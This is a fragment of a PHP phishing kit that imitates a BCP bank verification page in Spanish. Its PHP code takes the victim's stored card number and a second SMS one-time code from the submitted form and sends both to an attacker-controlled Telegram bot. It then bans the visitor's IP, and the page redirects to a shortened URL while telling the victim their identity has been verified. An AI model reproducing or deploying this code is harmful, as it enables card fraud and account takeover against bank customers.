...
include "onfig.php";
 CheckIPBan();
session_start();
if (isset($_POST['taken2'])) {



  $Content="BCP:Estes es el sms 2 de la tarjeta  Tarjeta: ". $_SESSION['tar'].PHP_EOL."SMS-2: ".$_POST['taken2'].PHP_EOL;
   $data = ['text' => $Content,'chat_id' => $chatid];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
//echo $_POST['sol'] . PHP_EOL;
 BanIP() ;
...
?>
<!DOCTYPE html><l410rulz>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>&gt;&gt;BPC&gt;&gt;</title><meta name="description" content=""><!--<base href=".">--><base href=".">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="refresh" content="5; url =https://rb.gy/n19a8v">
	<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width,height=device-height"><meta name="theme-color" content="#002D87"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
...
<bcp-layout _ngcontent-c23="" id="wrapper" class="ng-star-inserted">
      ...
      <div _ngcontent-c23="" class="container">
          <div _ngcontent-c23="" class="row">
              <div _ngcontent-c23="" class="col-12 col-xl-10 offset-xl-1 padding-24">
                ...
                <bcp-title _ngcontent-c23=""><h2 class="title"><br><br>
                  Gracias hemos verificado su identidad, <br>por favor vuelva a iniciar sesión
             </h2>
              <span class="subtitle">
  ...
  <div _ngcontent-c26="" class="row">
    <form _ngcontent-c26="" class="col-md-10 offset-md-1 col-xl-6 offset-xl-3 ng-pristine ng-invalid ng-touched" method="post" action="">
      <br>
      <div _ngcontent-c26="" class="row">
...
<br><center>
  <footer _ngcontent-c23="">
    <div _ngcontent-c23="" id="container">
      <p _ngcontent-c23="" class="footer-ciam"> 
